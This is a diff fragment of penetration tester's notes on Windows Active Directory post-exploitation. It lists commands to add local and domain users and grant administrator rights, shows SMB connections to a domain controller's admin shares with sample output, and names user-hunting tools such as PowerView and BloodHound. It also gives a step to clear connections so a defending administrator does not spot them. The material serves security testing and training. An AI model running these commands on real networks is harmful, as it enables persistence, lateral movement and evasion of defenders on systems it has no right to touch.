 
+ .. Todo ::
+
+   ----dsquery !! SubMSI ? -- Twitter one -- who publishes a lot of stuff ? MSUtil to use RCE? / smbexec? 
+   ----Any commands if net, or powershell is blocked? or PV/ BH is caught? 
 
 
+Hunting for a particular User?
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-Once we get the remote code execution or remote shell, Few useful commands to do recon/ create users
+* Powerview Invoke-UserHunter
 
+* BH users_sessions
 
+* EventLog AD? How? Not yet successful!
+
+* Finding which machine belong to which user? Any other way than above?
+
+* Machine belongs to which user AD Properties -- GETADObject (Tanoy)
+
+Useful Stuff:
+--------------
 
 Add/ remove/ a local user
--------------------------
+^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 :: 
 
@@ -609,80 +1044,70 @@ Add/ remove/ a local user
  The command completed successfully.
 
 Add a domain user
+^^^^^^^^^^^^^^^^^^^^
 
 ::
 
  net user username password /ADD /DOMAIN
 
 Add / remove a local user to administrator group
-------------------------------------------------
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 ::
 
  net localgroup administrators [username] /add
 
-Get sessions of remote machines
--------------------------------
 
-* Powerview Get-NetSession
+Accessing Remote machines:
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-* the windows binary? Global / Local?
+Setup an SMB connection with a host
+::
+ 
+ PS C:\> net use \\DC.xxxxxxxx.net
+ The command completed successfully.
 
-* NETDOM? -- Tanoy
+Check for access to admin shares ("C$", or "ADMIN$"), if we are admin:
 
-* net session
+::
 
-            
+ PS C:\> dir \\DC.xxxxxxxxxx.net\C$\Users
 
-View users in Domain / Workgroup
---------------------------------
-
-* Powerview Get-NetUser
-
-* net user /domain
-
-* netdom ? 
+ Directory: \\DC.xxxxxxxx.net\C$\Users
 
 
-View machines in Domain/ Workgroup
-----------------------------------
-
-* Powerview Get-NetComputers
-
-* net view /domain ? -- check the functionality
-
-* view machines affected by GPP vulnerability
+ Mode                LastWriteTime     Length Name
+ ----                -------------     ------ ----
+ d----        20.11.2016     09:35            adm.xxxxxx
+ d----        21.11.2010     06:47            Administrator
+ d-r--        14.07.2009     06:57            Public
 
 
+If we are not admin, we might get a access denied:
 
-View users in Domain / Workgroup
---------------------------------
+::
 
-* Powerview Get-NetGroupMember
+ PS C:\> dir \\DC.xxxxxxxxxx.net\C$\Users
+ Access is denied.
+ 
+Check your net connections:
 
-* Net group / domain? options
+::
 
-* BloodHound Group Memberships
-
-* Netdom
-
-
-
-Hunting for a particular User?
--------------------------------
-
-* Powerview Invoke-UserHunter
-
-* BH users_sessions
-
-* EventLog AD? How? Not yet successful!
-
-* Finding which machine belong to which user? Any other way than above?
-
-* Machine belongs to which user AD Properties -- GETADObject (Tanoy)
+ PS C:> net use
+ New connections will be remembered.
 
 
+ Status       Local     Remote                    Network 
+ 
+ -------------------------------------------------------------------------------
+ OK                     \\DC.xxxxxxxx.net\IPC$   Microsoft Windows Network
+ The command completed successfully.
+ 
+However, if administrator on DC.xxxxx.net runs a net session command, the connections would be detected. For that issue 
+::
 
+ net use /delete *
 
 
 Learning from the field: The post-exploitation 
